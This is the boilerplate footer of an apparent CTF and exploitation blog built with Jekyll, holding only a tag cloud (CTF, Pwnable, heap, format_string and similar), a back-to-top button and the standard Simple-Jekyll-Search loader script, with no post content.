    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

